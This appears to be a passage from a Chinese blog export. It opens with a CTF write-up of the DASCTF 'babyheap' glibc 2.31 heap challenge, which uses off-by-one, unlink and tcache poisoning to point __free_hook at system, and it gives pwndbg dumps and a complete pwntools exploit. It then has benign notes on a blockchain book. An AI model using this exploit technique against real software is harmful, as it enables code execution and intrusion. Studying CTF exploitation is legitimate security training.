<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995000</span><br><span class="line">Size: 0x291</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995290</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995490</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995690</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995890</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995a90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995c90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556995e90</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556996090</span><br><span class="line">Size: 0x1ff71</span><br></pre></td></tr></table></figure>
<h4 id="2-申请使用的四个块"><a href="#2-申请使用的四个块" class="headerlink" title="2.申请使用的四个块"></a>2.申请使用的四个块</h4><blockquote>
<p>在第一个chunk伪造一个chunk，做unlink攻击</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec090</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec1a0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec2c0</span><br><span class="line">Size: 0x201</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec4c0</span><br><span class="line">Size: 0x121</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557ec5e0</span><br><span class="line">Size: 0x1fa21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555557ec090</span><br><span class="line">0x5555557ec090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555557ec0a0:	0x0000000000000000	0x0000000000000221</span><br><span class="line">0x5555557ec0b0:	0x0000000000404128	0x0000000000404130</span><br><span class="line">0x5555557ec0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557ec0d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-释放七个块，填满tcache"><a href="#3-释放七个块，填满tcache" class="headerlink" title="3.释放七个块，填满tcache"></a>3.释放七个块，填满tcache</h4><blockquote>
<p>tcache填满，才会进行unlink，不然直接释放进入tcache中了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x555555fd6ea0 —▸ 0x555555fd6ca0 —▸ 0x555555fd6aa0 —▸ 0x555555fd68a0 —▸ 0x555555fd66a0 —▸ 0x555555fd64a0 —▸ 0x555555fd62a0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<h4 id="4-off-by-one"><a href="#4-off-by-one" class="headerlink" title="4.off by one"></a>4.off by one</h4><blockquote>
<p>填满chunk2，并修改chunk3的pre_size为伪造chunk大小</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555555adb3a0</span><br><span class="line">0x555555adb3a0:	0x0000000000000000	0x0000000000000121	#chunk2</span><br><span class="line">0x555555adb3b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3c0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb3f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb400:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb410:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb420:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb430:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb440:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb450:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb460:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb470:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb490:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555555adb4c0:	0x0000000000000220	0x0000000000000200	#chunk3</span><br><span class="line">0x555555adb4d0:	0x00007265746e6977	0x0000000000000000</span><br><span class="line">0x555555adb4e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="5-unlink合并"><a href="#5-unlink合并" class="headerlink" title="5.unlink合并"></a>5.unlink合并</h4><p>2.31中对unlink加入检查，需要size==pre_size</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>释放chunk3，则tcache满了，chunk3中chunk2的标志位为0，认为chunk2被释放，故进行向前合并，unlink</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55555654d090</span><br><span class="line">0x55555654d090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x55555654d0a0:	0x0000000000000000	0x0000000000000421#fake_chunk大小改变</span><br><span class="line">0x55555654d0b0:	0x00007f809c23bbe0	0x00007f809c23bbe0</span><br><span class="line">0x55555654d0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55555654d100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p> 此时已经造成堆块重叠了。</p>
<p> chunk1、chunk2与合并后的chunk重叠，并且合并后的chunk在unsortedbin中</p>
</blockquote>
<p><img src="/2021/05/13/20-52/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210513202435970.png" alt="image-20210513202435970"></p>
<h4 id="6-释放chunk-bk"><a href="#6-释放chunk-bk" class="headerlink" title="6.释放chunk bk"></a>6.释放chunk bk</h4><p>释放chunk2和chunk4，tcache是先进先出</p>
<ul>
<li>释放chunk2、chunk4</li>
<li>chunk2 -&gt; chunk4</li>
<li>申请顺序是chunk4、chunk2</li>
</ul>
<blockquote>
<p>此时，chunk2中的fd指向下一个被释放的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x555556fae1b0 —▸ 0x555556fae4d0 ◂— 0x0</span><br><span class="line">0x200 [  7]: 0x555556fadea0 —▸ 0x555556fadca0 —▸ 0x555556fadaa0 —▸ 0x555556fad8a0 —▸ 0x555556fad6a0 —▸ 0x555556fad4a0 —▸ 0x555556fad2a0 ◂— 0x0</span><br></pre></td></tr></table></figure>
<h4 id="7-切割unsortbin"><a href="#7-切割unsortbin" class="headerlink" title="7.切割unsortbin"></a>7.切割unsortbin</h4><blockquote>
<p>申请一个大于chunk1大小的chunk，这样改chunk和chunk1+chunk2重叠</p>
<p>通过改chunk修改chunk2的fd指针，指向free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原来0x421的chunk被分割前0x161给申请的块了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5555560e0090</span><br><span class="line">0x5555560e0090:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555560e00a0:	0x0000000000000000	0x0000000000000161#申请的chunk</span><br><span class="line">0x5555560e00b0:	0x0068732f6e69622f	0x6161616161616161#填入binsh</span><br><span class="line">0x5555560e00c0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e00f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0100:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0110:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0120:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0130:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0140:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0150:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0160:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0170:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0180:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e0190:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x5555560e01b0:	0x00007f2af2d3ab28	0x00005555560d0000#chunk2的fd被修改</span><br><span class="line">0x5555560e01c0:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  2]: 0x5555560e01b0 —▸ 0x7f2af2d3ab28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>
<h4 id="8-申请chunk2的fd为新的chunk"><a href="#8-申请chunk2的fd为新的chunk" class="headerlink" title="8.申请chunk2的fd为新的chunk"></a>8.申请chunk2的fd为新的chunk</h4><blockquote>
<p>chunk2的fd被修改为free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x120 [  1]: 0x7f4deb068b28 (__free_hook) ◂— 0x0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>free_hook作为chunk申请走了</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x200 [  7]: 0x55555636cea0 —▸ 0x55555636cca0 —▸ 0x55555636caa0 —▸ 0x55555636c8a0 —▸ 0x55555636c6a0 —▸ 0x55555636c4a0 —▸ 0x55555636c2a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br></pre></td></tr></table></figure>
<h4 id="9-chunk2的内容作为参数，释放"><a href="#9-chunk2的内容作为参数，释放" class="headerlink" title="9.chunk2的内容作为参数，释放"></a>9.chunk2的内容作为参数，释放</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
<p>即可get shell</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"babyheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.31/lib/ld-2.31.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.31/lib/libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"(y/n)"</span>)</span><br><span class="line">	p.send(<span class="string">"n"</span>)<span class="comment">#not line</span></span><br><span class="line">	p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">	p.sendline(str(content))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">puts_addr = int(p.recv(<span class="number">14</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr)) </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(i+<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x404140</span></span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x221</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x1f8</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">'winter'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x110</span></span><br><span class="line">payload += p64(<span class="number">0x220</span>)</span><br><span class="line">edit(<span class="number">15</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x150</span>,<span class="string">"/bin/sh\x00"</span>+<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x118</span>,p64(system))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h2><ul>
<li><p><a href="https://www.anquanke.com/post/id/236183" target="_blank" rel="noopener">MAR DASCTF题解</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/236179#h2-0" target="_blank" rel="noopener">2021 MAR DASCTF 部分PWN WriteUP</a></p>
</li>
<li><p><a href="https://r1nd0.github.io/2021/03/28/2021DASCTF-Mar-pwn-wp/" target="_blank" rel="noopener">2021DASCTF_Mar_pwn_wp(R1nd0)</a></p>
</li>
<li><p><a href="https://ainevsia.github.io/2021/03/30/2021MARDASCTF/" target="_blank" rel="noopener">2021MARDASCTF(无花果)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
      <tags>
        <tag>dasctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn Blockchain by Building One_book study</title>
    <url>/2021/08/07/23-59/</url>
    <content><![CDATA[<blockquote>
<p>来自Learn Blockchain by Building One的笔记</p>
</blockquote>
<h1 id="书本笔记"><a href="#书本笔记" class="headerlink" title="书本笔记"></a>书本笔记</h1><p><img src="/2021/08/07/23-59/image-20210801195944516.png" alt="image-20210801195944516"></p>
<h2 id="chapter-1"><a href="#chapter-1" class="headerlink" title="chapter 1"></a>chapter 1</h2><blockquote>
<p>主要就是讲工具安装（环境搭建）和一个小例子。</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>安装python、poetry</p>
<h4 id="poetry"><a href="#poetry" class="headerlink" title="poetry"></a>poetry</h4><p>poetry：管理python项目依赖关系</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">poetry new my-project	#用Poetry创建一个Python项目</span><br><span class="line">poetry add requests		#用Poetry添加python的依赖</span><br><span class="line">poetry shell			#Python解释器是不是在Poetry的virtualenv中</span><br></pre></td></tr></table></figure>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><h4 id="获得比特币价格"><a href="#获得比特币价格" class="headerlink" title="获得比特币价格"></a>获得比特币价格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">"https://api.coinbase.com/v2/prices/spot?currency=USD"</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731164527928.png" alt="image-20210731164527928"></p>
<h2 id="chapter-2"><a href="#chapter-2" class="headerlink" title="chapter 2"></a>chapter 2</h2><blockquote>
<p>主要讲hash，题目是“A Way to Identify<br>Everything”，也就是用hash可以验证发送的数据是否被修改</p>
</blockquote>
<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="1-Hashing-in-Python"><a href="#1-Hashing-in-Python" class="headerlink" title="1 Hashing in Python"></a>1 Hashing in Python</h5><blockquote>
<p>文字的hash</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># Hash functions expect bytes as input: the encode() method turns strings to bytes</span></span><br><span class="line">input_bytes = <span class="string">b"backpack"</span></span><br><span class="line">output = hashlib.sha256(input_bytes)</span><br><span class="line"><span class="comment"># We use hexdigest() to convert bytes to hex because it's easier to read</span></span><br><span class="line">print(output.hexdigest())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731164818639.png" alt="image-20210731164818639"></p>
<h5 id="2-Hashing-images"><a href="#2-Hashing-images" class="headerlink" title="2 Hashing images"></a>2 Hashing images</h5><blockquote>
<p>图片的hash</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">file = open(<span class="string">"my_image.jpg"</span>, <span class="string">"rb"</span>)</span><br><span class="line">hash = sha256(file.read()).hexdigest()</span><br><span class="line">file.close()</span><br><span class="line">print(<span class="string">f"The hash of my file is: <span class="subst">&#123;hash&#125;</span>"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731165008111.png" alt="image-20210731165008111"></p>
<h5 id="3-Sending-untamperable-emails"><a href="#3-Sending-untamperable-emails" class="headerlink" title="3 Sending untamperable emails"></a>3 Sending untamperable emails</h5><blockquote>
<p>加了一部分密文，hash</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">secret_phrase = <span class="string">"bolognese"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash_with_secret_phrase</span><span class="params">(input_data, secret_phrase)</span>:</span></span><br><span class="line">    combined = input_data + secret_phrase</span><br><span class="line">    <span class="keyword">return</span> sha256(combined.encode()).hexdigest()</span><br><span class="line">email_body = <span class="string">"Hey Bob,I think you should learn about Blockchains! I've been investing in Bitcoin and currently have exactly 12.03 BTC in my account."</span></span><br><span class="line">print(get_hash_with_secret_phrase(email_body,  secret_phrase))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731165316295.png" alt="image-20210731165316295"></p>
<h2 id="chapter-3"><a href="#chapter-3" class="headerlink" title="chapter 3"></a>chapter 3</h2><blockquote>
<p>实现区块链的链（修改后的，所以proof_of_work是chapter 4的</p>
<ul>
<li><code>__init__</code>：一开始创建初始块</li>
<li>new_block：创建块</li>
<li>hash：对块进行hash</li>
<li>last_block：取最后一个块</li>
<li>valid_block：判断是否是有效块（前4个是0</li>
<li>proof_of_work：一直生成块，知道有效块</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#blockchain.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blockchain</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.chain=[]</span><br><span class="line">		self.pending_transactions=[]</span><br><span class="line"></span><br><span class="line">		<span class="comment">#Create the genesis block</span></span><br><span class="line">		print(<span class="string">"Creating genesis block"</span>)</span><br><span class="line">		self.chain.append(self.new_block())</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">new_block</span><span class="params">(self)</span>:</span></span><br><span class="line">		block=&#123;</span><br><span class="line">			<span class="string">'index'</span>:len(self.chain),</span><br><span class="line">			<span class="string">'timestamp'</span>:datetime.utcnow().isoformat(),</span><br><span class="line">			<span class="string">'transactions'</span>:self.pending_transactions,</span><br><span class="line">			<span class="string">'previous_hash'</span>:self.last_block[<span class="string">"hash"</span>] <span class="keyword">if</span> self.last_block <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">			<span class="string">'nonce'</span>:format(random.getrandbits(<span class="number">64</span>),<span class="string">"x"</span>),</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		block_hash = self.hash(block)</span><br><span class="line">		block[<span class="string">"hash"</span>] = block_hash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		self.pending_transactions=[]</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(block)</span>:</span></span><br><span class="line"></span><br><span class="line">		block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">		<span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">	@property</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">last_block</span><span class="params">(self)</span>:</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> self.chain[<span class="number">-1</span>] <span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">valid_block</span><span class="params">(block)</span>:</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> block[<span class="string">'hash'</span>].startswith(<span class="string">"0000"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			new_block = self.new_block()</span><br><span class="line">			<span class="keyword">if</span> self.valid_block(new_block):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		self.chain.append(new_block)</span><br><span class="line">		print(<span class="string">"Found a new block: "</span>,new_block)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731165711500.png" alt="image-20210731165711500"></p>
<h2 id="chapter-4"><a href="#chapter-4" class="headerlink" title="chapter 4"></a>chapter 4</h2><blockquote>
<p>题目是工作量证明，</p>
</blockquote>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><h4 id="ipython"><a href="#ipython" class="headerlink" title="ipython"></a>ipython</h4><ul>
<li><p>与Python解释器交互的一个很棒的工具</p>
</li>
<li><p>使用制表符补全和语法高亮显示</p>
</li>
</ul>
<h3 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h3><p>挖矿：矿工通过找到一个哈希值小于给定值</p>
